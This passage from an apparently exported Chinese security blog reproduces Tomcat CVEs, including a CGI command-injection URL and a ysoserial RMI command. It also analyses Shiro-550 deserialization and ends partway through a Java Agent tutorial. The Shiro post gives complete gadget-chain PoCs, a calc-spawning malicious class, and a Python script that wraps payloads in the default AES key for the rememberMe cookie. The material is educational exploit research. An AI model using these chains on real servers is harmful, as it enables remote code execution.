Servlet受到远程执行代码的攻击。\n触发该漏洞需要同时满足以下条件：\n\n1.  系统为Windows \n2.  启用了CGI Servlet（默认为关闭） \n3.  启用了enableCmdLineArguments（Tomcat 9.0.*及官方未来发布版本默认为关闭） \n\n**影响范围**\nApache Tomcat 9.0.0.M1 to 9.0.17\nApache Tomcat 8.5.0 to 8.5.39\nApache Tomcat 7.0.0 to 7.0.93\n\n### 复现\n首先进行CGI相关的配置，在 conf/web.xml 中启用CGIServlet：\n```xml\n<servlet>\n  <servlet-name>cgi</servlet-name>\n  <servlet-class>org.apache.catalina.servlets.CGIServlet</servlet-class>\n  <init-param>\n    <param-name>cgiPathPrefix</param-name>\n    <param-value>WEB-INF/cgi-bin</param-value>\n  </init-param>\n  <init-param>\n    <param-name>enableCmdLineArguments</param-name>\n    <param-value>true</param-value>\n  </init-param>\n  <init-param>\n    <param-name>executable</param-name>\n    <param-value></param-value>\n  </init-param>\n  <load-on-startup>5</load-on-startup>\n</servlet>\n```\n就将原来的注释去掉，在添加属性\n这里主要的设置是 enableCmdLineArguments 和 executable 两个选项。 enableCmdLineArguments 启用后才会将Url中的参数传递到命令行， executable 指定了执行的二进制文件，默认是 perl，需要置为空才会执行文件本身。\n\n同样在 conf/web.xml 中启用cgi的servlet-mapping\n```xml\n\n<servlet-mapping>\n    <servlet-name>cgi</servlet-name>\n    <url-pattern>/cgi-bin/*</url-pattern>\n</servlet-mapping>\n```\n之后修改 conf/context.xml 的 <Context> 添加 privileged=\"true\"属性，否则会没有权限\n```xml\n\n<Context privileged=\"true\">\n\n    <!-- Default set of monitored resources. If one of these changes, the    -->\n    <!-- web application will be reloaded.                                   -->\n    <WatchedResource>WEB-INF/web.xml</WatchedResource>\n    <WatchedResource>WEB-INF/tomcat-web.xml</WatchedResource>\n    <WatchedResource>${catalina.base}/conf/web.xml</WatchedResource>\n\n    <!-- Uncomment this to disable session persistence across Tomcat restarts -->\n    <!--\n    <Manager pathname=\"\" />\n    -->\n</Context>\n```\n然后在 ROOT\\WEB-INF 下创建 cgi-bin 目录, 并在该目录下创建一个内容为 echo Content-type: text/html 的 e.bat 文件。\n\n配置完成后，启动tomcat，访问 http://127.0.0.1:8080/cgi-bin/e.bat?&ver ，可以看到命令执行成功。\n\n### 原理\n[https://xz.aliyun.com/t/4875?](https://xz.aliyun.com/t/4875?)\n\n## Tomcat 反序列化漏洞 (CVE-2016-8735)\n### 漏洞描述\n之前Oracle发布的mxRemoteLifecycleListener反序列化漏洞（CVE-2016-3427）相关，是由于使用了JmxRemoteLifecycleListener的监听功能所导致。而在Oracle官方发布修复后，Tomcat未能及时修复更新而导致的远程代码执行。 该漏洞所造成的最根本原因是Tomcat在配置JMX做监控时使用了JmxRemoteLifecycleListener的方法。\n\n**条件**\n外部需要开启JmxRemoteLifecycleListener监听的10001和10002端口，来实现远程代码执行。\n```xml\n<Listener className=\"org.apache.catalina.mbeans.JmxRemoteLifecycleListener\" rmiRegistryPortPlatform=\"10001\" rmiServerPortPlatform=\"10002\" />\n```\n\n\n**影响版本**\nApache Tomcat 9.0.0.M1 to 9.0.0.M11\nApache Tomcat 8.5.0 to 8.5.6\nApache Tomcat 8.0.0.RC1 to 8.0.38\nApache Tomcat 7.0.0 to 7.0.72\nApache Tomcat 6.0.0 to 6.0.47\n\n打RMI:\n```shell\njava -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.0.167 10001 Groovy1 \"calc.exe\"\n```\n需要Groovy相关依赖\n（暂无找到分析文章）\n\n\n## 样例目录session操控漏洞\n\n同一个tomcat下面，两个项目之间ession不能共享。所以\"Apache Tomcat示例目录漏洞\"对其他项目的威胁不大，但仍建议在部署环境中删除tomcat示例。\n按照Servlet规范，session的作用范围应该仅仅限于当前应用程序下，不同的应用程序之间是不能够相互访问对方的session的。各个应用服务器从实际效果上都遵守了这一规范，但实现细节却可能不同，因此解决跨应用程序session共享的方法也各不相同。\n在examples目录下创建一个jsp登录管理的页面，即可实现对session的操控。\n[http://47.104.218.243:8080/login/login.jsp](http://47.104.218.243:8080/login/login.jsp)\n### 检测链接\n[http://localhost:8080/examples/servlets/servlet/SessionExample](http://localhost:8080/examples/servlets/servlet/SessionExample)\n在Name of Session Attribute: 里输入login\n在Value of Session Attribute:里输入admin\n\n提交后显示login=admin已经写入session\n\n然后就可以访问\nhttp://localhost:8080/examples/index.jsp\n\n\n## 其他漏洞集合\n**Tomcat本地提权漏洞(CVE-2016-1240)，Tomcat本地提权漏洞分析与防御。**\nApache Tomcat 拒绝服务漏洞CVE-2014-0230\nApache Tomcat Manager和Host Manager应用程序安全漏洞(CVE-2015-5351)\nApache Tomcat session-persistence 远程代码执行漏洞(CVE-2016-0714)\nApache Tomcat 会话固定漏洞(CVE-2015-5346)\nApache Tomcat 远程代码执行漏洞(CVE-2016-8735)\nApache Tomcat Commons Fileupload 拒绝服务漏洞(CVE-2016-3092)\nApache Tomcat httpoxy 安全漏洞(CVE-2016-5388)\nApache Tomcat 安全绕过漏洞(CVE-2016-6816)\nApache Tomcat AJP协议安全绕过漏洞\nApache Tomcat 安全绕过漏洞(CVE-2012-3439)\nTomcat 拒绝服务漏洞(CVE-2014-0050)\nApache Tomcat 安全漏洞(CVE-2017-6056)\nApache Tomcat 安全漏洞(CVE-2017-5648)\nApache Tomcat Default Servlet 安全漏洞(CVE-2017-5664)\nTomcat 信息泄露漏洞(CVE-2017-12616)\nApache Tomcat 安全漏洞(CVE-2017-12617)\nApache Tomcat 安全漏洞(CVE-2017-5647)\nApache Tomcat 安全漏洞(CVE-2018-1304)\nApache Tomcat 安全漏洞(CVE-2018-1305)\n","tags":["Tomcat","web中间件","漏洞复现"],"categories":["web安全"]},{"title":"shiro550","url":"/2024/05/06/shiro550-md-yyj/","content":"\n\n\n\n# shiro550\n\n\n## 简介\nApache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API，您可以快速、轻松地获得任何应用程序，从最小的移动应用程序到最大的网络和企业应用程序。\nApache Shiro基本功能点如下图所示：\n\n- **Authentication**：身份认证 / 登录，验证用户是不是拥有相应的身份；\n- **Authorization**：授权，即权限验证，验证某个已认证的用户是否拥有某个权限；即判断用户是否能做事情，常见的如：验证某个用户是否拥有某个角色。或者细粒度的验证某个用户对某个资源是否具有某个权限；\n- **Session** **Management**：会话管理，即用户登录后就是一次会话，在没有退出之前，它的所有信息都在会话中；会话可以是普通 JavaSE 环境的，也可以是如 Web 环境的；\n- **Cryptography**：加密，保护数据的安全性，如密码加密存储到数据库，而不是明文存储；\n- **Web Support**：Web 支持，可以非常容易的集成到 Web 环境；\n- **Caching**：缓存，比如用户登录后，其用户信息、拥有的角色 / 权限不必每次去查，这样可以提高效率；\n- **Concurrency**：shiro 支持多线程应用的并发验证，即如在一个线程中开启另一个线程，能把权限自动传播过去；\n- **Testing**：提供测试支持；\n- **Run As**：允许一个用户假装为另一个用户（如果他们允许）的身份进行访问；\n- **Remember Me**：记住我，这个是非常常见的功能，即一次登录后，下次再来的话不用登录了；\n\n注意，本次的Shiro反序列化漏洞点就是出现在**Remember Me**这个功能模块\n\n## 环境部署\nshiro源码下载：[https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4](https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4)\nwar包地址：[https://github.com/jas502n/SHIRO-550](https://github.com/jas502n/SHIRO-550)\n\n/sample/web 模块\n配置Tomcat\n<img src=\"/img/5-6/1.png\" >\n如果报错添加依赖\n```xml\n<!--         JSTL 表达式依赖-->\n<dependency>\n  <groupId>javax.servlet.jsp.jstl</groupId>\n  <artifactId>jstl-api</artifactId>\n  <version>1.2</version>\n</dependency>\n<!--        standard-->\n<dependency>\n  <groupId>taglibs</groupId>\n  <artifactId>standard</artifactId>\n  <version>1.1.2</version>\n</dependency>\n```\n<img src=\"/img/5-6/2.png\" >\n\n## 过程调试\n进入登录页面，勾选RemeberMe进行登录\n登录成功后，抓包，删除JSSESIONID(优先级较高)，然后调式\n### 加密\n入口是在 AbstractRememberMeManager#onSuccessfulLogin 方法\n这里我们正向分析一下，debug打个断点，然后web登录页面输入root/secret 口令进行提交，再回到IDEA中查看\n\n<img src=\"/img/5-6/3.png\" >\n继续跟进\n<img src=\"/img/5-6/4.png\" >\n进入AbstractRememberMeManager#convertPrincipalsToBytes\n<img src=\"/img/5-6/5.png\" >\n对结果对象序列化为字节数组，然后进行加密\n进入encrypt，看看怎么加密\n<img src=\"/img/5-6/6.png\" >\n加密服务cipherService\n<img src=\"/img/5-6/7.png\" >\nAES-CBC模式加密，秘钥长度128位\n跟进getEncryptionCipherKey（）\n<img src=\"/img/5-6/8.png\" >\n<img src=\"/img/5-6/9.png\" >\n继续跟踪在哪里赋值的，查找用法\n<img src=\"/img/5-6/10.png\" >\n继续查找用法\n<img src=\"/img/5-6/11.png\" >\n这里加解密秘钥赋值相同，继续查找setCipherKey的用法\n<img src=\"/img/5-6/12.png\" >\nAbstractRememberMeManager的构造方法理面\n继续查看常量\n<img src=\"/img/5-6/13.png\" >\n```java\nprivate static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(\"kPH+bIxk5D2deZiIxcaaaA==\");\n```\n发现AES加解密使用默认秘钥\nshiro550一个关键点就是使用默认的秘钥\n然后使用默认key进行AES加密（具体就不看了，随机生成一个初始向量......）\n返回得到加密数据字符数组\n<img src=\"/img/5-6/14.png\" >\n跟进rememberSerializedIdentity\n<img src=\"/img/5-6/15.png\" >\n将AES加密后数据Base64编码写入cookie里面\ngetCookie，获得到cookie的一些属性设置\n<img src=\"/img/5-6/16.png\" >\n所以会写入cookie里面的rememberMe字段\n\n总结就是使用固定key对序列化数据进行AES加密，然后base64编码后写入cookie里面的rememberMe字段中\n### 解密\nshiro进行权限校验是通过Filter实现的\nOncePerRequestFilter#doFilter\n->AbstractShiroFilter#doFilterInternal\n查看对应方法\n<img src=\"/img/5-6/17.png\" >\n跟进createSubject\n<img src=\"/img/5-6/18.png\" >\nbuildSubject会调用DefaultSecurityManager中的createSubject\n<img src=\"/img/5-6/19.png\" >\n\n<img src=\"/img/5-6/20.png\" >\n跟进resolvePrincipals\n<img src=\"/img/5-6/21.png\" >\n继续跟进\n到AbstractRememberMeManager#getRememberedPrincipals\n<img src=\"/img/5-6/22.png\" >\n先获取cookie中序列化数据，然后再反序列化\n\n1. 调用父类\n\nCookieRememberMeManager#getRememberedSerializedIdentity\n<img src=\"/img/5-6/23.png\" >\n获取cookie Remeberme字段并base64解码并返回数据\n接着进入convertBytesToPrincipals方法\n<img src=\"/img/5-6/24.png\" >\n解码后数据解密再反序列化\n解密与加密对称，也是使用默认秘钥\n<img src=\"/img/5-6/25.png\" >\n反序列化\n<img src=\"/img/5-6/26.png\" >\n\n\n## 利用链\n### URLDNS链探测\n```java\n//URLDNS.java\n \nimport java.io.*;\nimport java.util.HashMap;\nimport java.net.URL;\nimport java.lang.reflect.Field;\n \npublic class URLDNS {\n    public static void main(String[] args) throws Exception{\n        HashMap map=new HashMap();\n        URL url=new URL(\"http://e2hvmezvglr70to8gako0p6ycpig65.burpcollaborator.net\");\n \n        Class clazz=Class.forName(\"java.net.URL\");\n        Field hashcode=clazz.getDeclaredField(\"hashCode\");\n        hashcode.setAccessible(true);\n        hashcode.set(url,123);\n//        System.out.println(hashcode.get(url));\n        map.put(url,\"test\");\n        hashcode.set(url,-1);\n \n        serialize(map);\n//        unserialize(\"ser.bin\");\n \n \n    }\n    //序列化\n    public static void serialize(Object obj) throws IOException {\n        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));\n        oos.writeObject(obj);\n    }\n \n    //反序列化\n    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{\n        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));\n        Object object=ois.readObject();\n        return object;\n    }\n}\n```\n### 没有cc依赖\ncb链(CommonsBeanUtils1 )\n打shiro时cb的版本为1.8.3\n```\n<dependency>\n    <groupId>commons-beanutils</groupId>\n    <artifactId>commons-beanutils</artifactId>\n    <version>1.8.3</version>\n</dependency>\n```\n#### cb漏洞点\nApache Commons 工具集下除了 collections 以外还有 BeanUtils ，它主要用于操控 JavaBean 。\n\n- 以 Utils 结尾，一般这都是一个工具类/集\n\nCommons-BeanUtils 中提供了一个静态方法 PropertyUtils.getProperty ，\n这个函数其实就是获取Bean中的某个属性的值，\n而底层是使用反射调用了javaBean的getxxx的方法来获取值的\n示例如下\n```java\nimport org.apache.commons.beanutils.PropertyUtils;  \n\npublic class CBMethods {  \n    public static void main(String[] args) throws Exception{  \n        Person yyjccc = new Person(666, \"yyjccc\");\n        PropertyUtils.getProperty(yyjccc,\"id\");\n        PropertyUtils.getProperty(templates,\"outputProperties\");\n    }  \n}\n```\n而在前面cc3链([cc3链](https://vxxly2ajy0y.feishu.cn/wiki/UGXuwuGYyiJv1LkFHe8cxljDnce) )中动态加载字节码的类TemplatesImpl中存在getOutputProperties()，且里面调用了方法newTransformer，而且刚好是javabean的getxxx\n#### 链子分析\n我们的链子\n_PropertyUtils.getProperty函数中会掉到这里_\n<img src=\"/img/5-6/27.png\" >\n进入getSimpleProperty函数，在这个函数中会使用getxxx函数\n<img src=\"/img/5-6/28.png\" >\nTemplatesImpl中存在getOutputProperties()\n<img src=\"/img/5-6/29.png\" >\n触发newTransformer,从而动态加载了字节码，因为getProperty加载的是get，直接传outputProperties\n```\nPropertyUtils.getProperty(templates,\"outputProperties\");\n```\n\n- 查找getProperty的调用点\n\n在BeanComparator中的compare方法就刚刚好\n<img src=\"/img/5-6/30.png\" >\n\n- 继续寻找，其实cc2中就有compare，参考cc2中的入口类\n\n使用PriorityQueue，需要传入一个comparetor，\n这里直接传BeanComparator，并初始化设置属性property为outputProperties，为了触发getOutputProperties方法\n<img src=\"/img/5-6/31.png\" >\n```\nBeanComparator<Object> objectBeanComparator = new BeanComparator<>(\"outputProperties\");\nPriorityQueue<Object> priorityqueue = new PriorityQueue<>(objectBeanComparator);\n```\n这样写是不行的，\n\n- 首先解决序列化时候报错\n\n<img src=\"/img/5-6/32.png\" >\n这是因为在调用add的时候，就会触发该类的compare方法，来寻找该类了，因此就只能通过反射修改\n```\nClass c = transformingComparator.getClass();\nField tfactoryfeild = c.getDeclaredField(\"transformer\");\ntfactoryfeild.setAccessible(true);\ntfactoryfeild.set(transformingComparator,invokerTransformer);\n```\n若new的时候传入使用CC2中的comparator，也样也不行，虽然序列化成功，但在打shiro的时候不会成功\n这是因为我们使用这个构造方法时，使用了common-collection3包里面的函数，而shiro默认没有cc依赖，因此会出错\n<img src=\"/img/5-6/33.png\" >\n那么只有换个构造方法，使用这个，我们需要传入一个comparartor\n<img src=\"/img/5-6/34.png\" >\n随便找一个Comparator类\n```java\nBeanComparator<Object> objectBeanComparator = new BeanComparator<>(\"outputProperties\",new AttrCompare());\n```\n恶意类\n```java\npackage org.example;\n\nimport java.io.IOException;\n\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n\npublic class test extends AbstractTranslet{\n    static {\n        try {\n            Runtime.getRuntime().exec(\"calc\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n\n    }\n\n    @Override\n    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n\n    }\n}\n```\n#### 最后poc\n```java\npackage org.example;\nimport beans.Person;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;\nimport org.apache.commons.beanutils.BeanComparator;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\nimport org.apache.commons.collections4.functors.ConstantTransformer;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.PriorityQueue;\n\n\npublic class cb {\n    public static void main(String[] args) throws Exception {\n        //CC3\n        TemplatesImpl templates = new TemplatesImpl();\n        Class c1=templates.getClass();\n        Field namefield = c1.getDeclaredField(\"_name\");\n        namefield.setAccessible(true);\n        namefield.set(templates,\"aaa\");\n        Field bytecodes=c1.getDeclaredField(\"_bytecodes\");\n        bytecodes.setAccessible(true);\n        byte [] code= Files.readAllBytes(Paths.get(\"D:\\\\coderesp\\\\java\\\\learn\\\\exp\\\\target\\\\classes\\\\org\\\\example\\\\test.class\"));\n        byte[][] codes={code};\n        bytecodes.set(templates,codes);\n        Field tfactoryfield = c1.getDeclaredField(\"_tfactory\");\n        tfactoryfield.setAccessible(true);\n        tfactoryfield.set(templates,new TransformerFactoryImpl());\n\n        //CB\n        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));\n        BeanComparator<Object> objectBeanComparator = new BeanComparator<>(\"outputProperties\",new AttrCompare());\n\n        //CC2\n        PriorityQueue<Object> priorityqueue = new PriorityQueue<>(transformingComparator);\n        priorityqueue.add(templates);\n        priorityqueue.add(1);\n        Class c3 = priorityqueue.getClass();\n        Field comparatorfield = c3.getDeclaredField(\"comparator\");\n        comparatorfield.setAccessible(true);\n        comparatorfield.set(priorityqueue,objectBeanComparator);\n\n        utils.tools.serialize(priorityqueue);\n\n    }\n}\n```\n\n**ysoserial**\n```\njava -jar ysoserial-all.jar CommonsBeanutils1 calc >ser.bin\n```\n这里打shiro可能会失败，原因是**ysoserial使用的cb库版本为1.9，可能与shiro自带的cb版本不对，从而失败**\n\n### 有cc依赖\n#### 概述\n常规的链子都会用到Transfer数组，而shiro和tomcat的类加载机制，使其在反序列化的时候无法加载这个数组（具体原因...），导致攻击链失效\n因此需要避免使用数组，而这条链就是没有使用数组\n#### 思路\nCC3+CC2+CC6\n动态类加载+InvokeTransformer+TideEntry-hashmap入口类\n#### 再度分析\n使用cc3中的动态类加载\n将cc3前面部分拿过来\n```java\n//cc3\nTemplatesImpl templates= new TemplatesImpl();\n\nClass tc=templates.getClass();\nField namefield = tc.getDeclaredField(\"_name\");\nnamefield.setAccessible(true);\nnamefield.set(templates,\"aaa\");\nField bytecodefield = tc.getDeclaredField(\"_bytecodes\");\nbytecodefield.setAccessible(true);\n//赋给我们的字节码,二维数组，代码会循环遍历\nbyte[] code= Files.readAllBytes(Paths.get(\"D:\\\\coderesp\\\\java\\\\learn\\\\exp\\\\target\\\\classes\\\\org\\\\example\\\\test.class\"));;\nbyte [][]  codes={code};\nbytecodefield.set(templates,codes);\n\nField tfactoryfield = tc.getDeclaredField(\"_tfactory\");\ntfactoryfield.setAccessible(true);\n//在readObject中赋值了new TransformerFactoryImpl()\ntfactoryfield.set(templates,new TransformerFactoryImpl());\n```\nInvokeTransformer可以直接调用newTransformer方法进行类加载\n入口类\n\n- HashMap.readObject()会触发hashCode方法\n- TiedMapEntry中的HashCode调用了getValue(),getVaule中调了get\n- LazyMap 这个类的 get 方法中出现了 .transform 方法\n\n因此只需要将TiedMapEntry放入LazyMap ，再把TiedMapEntry放入hashmap\n就会触发LazyMap中的key的get,\n#### 最终poc\n```java\npackage org.example;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport javax.xml.transform.TransformerConfigurationException;\nimport java.io.IOException;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class c11 {\n    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException {\n\n        //cc3\n        TemplatesImpl templates= new TemplatesImpl();\n\n        Class tc=templates.getClass();\n        Field namefield = tc.getDeclaredField(\"_name\");\n        namefield.setAccessible(true);\n        namefield.set(templates,\"aaa\");\n        Field bytecodefield = tc.getDeclaredField(\"_bytecodes\");\n        bytecodefield.setAccessible(true);\n        //赋给我们的字节码,二维数组，代码会循环遍历\n        byte[] code= Files.readAllBytes(Paths.get(\"D:\\\\coderesp\\\\java\\\\learn\\\\exp\\\\target\\\\classes\\\\org\\\\example\\\\test.class\"));;\n        byte [][]  codes={code};\n        bytecodefield.set(templates,codes);\n\n        Field tfactoryfield = tc.getDeclaredField(\"_tfactory\");\n        tfactoryfield.setAccessible(true);\n        //在readObject中赋值了new TransformerFactoryImpl()\n        tfactoryfield.set(templates,new TransformerFactoryImpl());\n\n        //CC2\n        InvokerTransformer invokerTransformer = new InvokerTransformer(\"newTransformer\",null,null);\n\n\n        //CC6\n        HashMap<Object, Object> hashMap = new HashMap<>();\n        hashMap.put(\"value\",\"hu\");\n        Map<Object,Object> decoratemap=LazyMap.decorate(hashMap,new ConstantTransformer(1));\n        TiedMapEntry tiedMapEntry=new TiedMapEntry(decoratemap,templates);\n        //tidemapentry->内嵌LazyMap->内嵌HashMap,再放入hashmap\n        HashMap<Object,Object> map2=new HashMap<>();\n        map2.put(tiedMapEntry,\"sss\");\n        decoratemap.remove(templates);\n        Class c=decoratemap.getClass();\n        Field factory=c.getDeclaredField(\"factory\");\n        factory.setAccessible(true);\n        factory.set(decoratemap,invokerTransformer);\n        utils.tools.serialize(map2);\n\n    }\n}\n```\n\n## AES+base64加密脚本\n```python\nfrom Crypto.Cipher import AES\nimport uuid\nimport base64\n\ndef convert_bin(file):\n    with open(file,'rb') as f:\n        return f.read()\n\n\ndef AES_enc(data):\n    BS=AES.block_size\n    pad=lambda s:s+((BS-len(s)%BS)*chr(BS-len(s)%BS)).encode()\n    key=\"kPH+bIxk5D2deZiIxcaaaA==\"\n    mode=AES.MODE_CBC\n    iv=uuid.uuid4().bytes\n    encryptor=AES.new(base64.b64decode(key),mode,iv)\n    ciphertext=base64.b64encode(iv+encryptor.encrypt(pad(data))).decode()\n    return ciphertext\n\nif __name__==\"__main__\":\n    data=convert_bin(\"ser.bin\")\n    print(AES_enc(data))\n```\n","tags":["java安全","java反序列化漏洞","shiro"],"categories":["java安全"]},{"title":"java Agent","url":"/2024/05/04/java-Agent/","content":"\n\n\n\n# java Agent\n\n\nJDK1.5开始，Java新增了Instrumentation(Java Agent API)和JVMTI(JVM Tool Interface)功能，允许JVM在加载某个class文件之前对其字节码进行修改，同时也支持对已加载的class(类字节码)进行重新加载(Retransform)。\n利用Java Agent这一特性衍生出了APM(Application Performance Management，应用性能管理)、RASP(Runtime application self-protection，运行时应用自我保护)、IAST(Interactive Application Security Testing，交互式应用程序安全测试)等相关产品，它们都无一例外的使用了Instrumentation/JVMTI的API来实现动态修改Java类字节码并插入监控或检测代码。\n\n## 简介\nJava Agent 本质上可以理解为一个插件，该插件就是一个精心提供的 Jar 包。只是启动方式和普通 Jar 包有所不同，对于普通的 Jar 包，通过指定类的 main 函数进行启动。但是 Java Agent 并不能单独启动，必须依附在一个 Java 应用程序运行，在面向切面编程方面应用比较广泛\n\nJava Agent 的 Jar 包通过 JVMTI（JVM Tool Interface）完成加载，最终借助 JPLISAgent（Java Programming Language Instrumentation Services Agent）完成对目标代码的修改。主要功能如下：\n\n可以在加载 Java 文件之前做拦截把字节码做修改\n可以在运行期将已经加载的类的字节码做变更\n在 JDK1.5 版本开始，Java 增加了 Instrumentation（Java Agent API）和 JVMTI（JVM Tool Interface）功能，该功能可以实现 JVM 在加载某个 class 文件对其字节码进行修改，也可以对已经加载的字节码进行一个重新的加载。而在 1.6 版本新增了 Attach（附加）方式，可以对运行中的 Java 进程插入 Agent。Java Agent 可以去实现字节码插桩、动态跟踪分析等，比如 RASP 产品和 Java Agent 内存马\n\n\n\n\n\n对于 Agent（代理）来讲，其大致可以分为两种，一种是在 JVM 启动前加载的premain-Agent，另一种是 JVM 启动之后加载的 agentmain-Agent。这里我们可以将其理解成一种特殊的 Interceptor（拦截器），如下图\n**Premain-Agent**\n<img src=\"/img/5-4/1.png\" >\n**agentmain-Agent**\n<img src=\"/img/5-4/2.png\" >\nJava agent的使用方式有两种：\n\n- 实现premain方法，在JVM启动前加载。\n- 实现agentmain方法，在JVM启动后加载。\n\npremain和agentmain函数声明如下，拥有Instrumentation inst参数的方法**优先级更高**：\n```java\npublic static void agentmain(String agentArgs, Instrumentation inst) {\n    ...\n}\n\npublic static void agentmain(String agentArgs) {\n    ...\n}\n\npublic static void premain(String agentArgs, Instrumentation inst) {\n    ...\n}\n\npublic static void premain(String agentArgs) {\n    ...\n}\n```\n第一个参数String agentArgs就是Java agent的参数。\n\nava Agent还限制了我们必须以jar包的形式运行或加载，我们必须将编写好的Agent程序打包成一个jar文件。除此之外，Java Agent还强制要求了所有的jar文件中必须包含/META-INF/MANIFEST.MF文件，且该文件中必须定义好Premain-Class（Agent模式）或Agent-Class:（Agent模式）配置\n## 使用\n### premain\n**构建**\n编写agent项目\n```java\npackage com.yyjccc;\n\nimport java.lang.instrument.Instrumentation;\n\npublic class PerMain {\n\tpublic static void premain(String args, Instrumentation instrumentation) throws InterruptedException {\n\t\tnew Thread(new Runnable() {\n\t\t\t@Override\n\t\t\tpublic void run() {\n\t\t\t\tfor (int i = 0; i < 10; i++) {\n\t\t\t\t\tSystem.out.println(\"my Agent --\"+i);\n\t\t\t\t\ttry {\n\t\t\t\t\t\tThread.sleep(1000*5);\n\t\t\t\t\t} catch (InterruptedException e) {\n\t\t\t\t\t\tthrow new RuntimeException(e);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}).start();\n\t}\n}\n\n```\n打包成jar\n使用idea打包\n<img src=\"/img/5-4/3.png\" >\nagent不要选取主类，选择通过清单链接\n在src/main/resources/目录下修改META-INF/MANIFEST.MF，需要指定Premain-Class，注意最后的换行\n```java\nManifest-Version: 1.0\nPremain-Class: com.yyjccc.PerMain\n\n```\n然后idea输出构建工件\n<img src=\"/img/5-4/4.png\" >\n最后得到需要附加的Agnet jar包\n<img src=\"/img/5-4/5.png\" >\n\n**使用**\n测试主程序\n```java\npackage com.yyjccc;\n\npublic class Main {\n\tpublic static void main(String[] args) throws InterruptedException {\n\t\tfor (int i = 0; i < 100; i++) {\n\t\t\tSystem.out.println(i);\n\t\t\tThread.sleep(1000*2);\n\t\t}\n\t}\n}\n```\n配置启动设置\n添加虚拟机选项VM option\n设置-javaagent  值为刚才的jar包路径\n```java\n-javaagent:F:\\code\\java\\myAgent\\myAgent\\target\\artifacts\\myAgent_jar\\myAgent.jar\n```\n运行程序\n<img src=\"/img/5-4/6.png\" >\n附加的包的premain方法会在Main函数之前执行（这里是多开了一个线程）\n还有直接使用命令\n```java\njava  -javaagent:F:\\code\\java\\myAgent\\myAgent\\target\\artifacts\\myAgent_jar\\myAgent.jar -jar .\\common.jar\n```\n**缺陷**\n这种方法存在一定的局限性——**只能在启动时使用-javaagent参数指定**。在实际环境中，目标的JVM通常都是已经启动的状态，无法预先加载premain。相比之下，agentmain更加实用。\n\n### agentmain\n写一个agentmain和premain差不多，只需要在META-INF/MANIFEST.MF中加入Agent-Class:即可，且编写的是agentmain方法\n```java\nManifest-Version: 1.0\nPremain-Class: com.yyjccc.PerMain\nAgent-Class: com.yyjccc.AgentMain\n\n```\n附加Agent的代码\n```java\npackage com.yyjccc;\n\nimport java.lang.instrument.Instrumentation;\n\npublic class AttachAgent {\n\tpublic static void agentmain(String args, Instrumentation instrumentation) {\n\t\tfor (int i = 0; i < 10; i++) {\n\t\t\tSystem.out.println(\"Attach Agent --\"+i);\n\t\t}\n\t}\n}\n\n```\n同样的要将Agent程序打包成jar \n\n不同的是，这种方法不是通过JVM启动前的参数来指定的，官方为了实现启动后加载，提供了Attach API。Attach API 很简单，只有 2 个主要的类，都在 com.sun.tools.attach 包里面。着重关注的是VitualMachine这个类。\n\n#### VirtualMachine\nJDK 默认有tools.jar，JRE 默认没有。并且 Linux 和 Windows 之间是存在一个适配问题\n字面意义表示一个Java 虚拟机，也就是程序需要监控的目标虚拟机，提供了获取系统信息、 loadAgent，Attach 和 Detach 等方法，可以实现的功能可以说非常之强大 。该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上 。代理类注入操作只是它众多功能中的一个，通过loadAgent方法向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例\n（注意jdk8 , 依赖是tool.jar）在jdk安装目录中的lib目录下，idea中手动加一下\n<img src=\"/img/5-4/7.png\" >\n\n下面列几个这个类提供的方法：\n```java\npublic abstract class VirtualMachine {\n    // 获得当前所有的JVM列表\n    public static List<VirtualMachineDescriptor> list() { ... }\n\n    // 根据pid连接到JVM\n    public static VirtualMachine attach(String id) { ... }\n\n    // 断开连接\n    public abstract void detach() {}\n\n    // 加载agent，agentmain方法靠的就是这个方法\n    public void loadAgent(String agent) { ... }\n\n}\n```\n根据提供的api，可以写出一个attacher\n实现注入的代码\n```java\npackage com.yyjccc;\n/**\n * jdk>=9\n */\n\nimport com.sun.tools.attach.AgentInitializationException;\nimport com.sun.tools.attach.AgentLoadException;\nimport com.sun.tools.attach.AttachNotSupportedException;\nimport com.sun.tools.attach.VirtualMachine;\n\nimport java.io.IOException;\n\npublic class AgentMain {\n\tpublic static void main(String[] args) throws AgentLoadException, IOException, AgentInitializationException, AttachNotSupportedException {\n\t\tString id = 